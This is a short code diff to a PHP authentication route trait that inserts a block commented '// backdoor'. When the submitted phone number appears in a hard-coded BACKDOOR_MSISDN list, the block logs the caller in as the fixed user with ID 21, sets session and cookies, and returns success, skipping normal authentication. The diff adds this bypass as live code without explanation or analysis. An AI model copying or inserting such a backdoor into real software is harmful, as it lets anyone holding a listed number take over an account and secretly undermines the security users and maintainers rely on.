@@ -27,6 +27,14 @@ trait AuthRoutes{
         }
 
         $as2 = new AuthService2($bundle);
+
+        // backdoor
+        if(in_array($msisdn, AuthService2::BACKDOOR_MSISDN)){
+            $user = User::find(21);
+            $as2->writeUserSessionAndCookies($user);
+            return response()->json(['result' => 'ok']);
+        }
+
         $user = $as2->getUser($msisdn);
         if($user){
             $as2->writeUserSessionAndCookies($user);
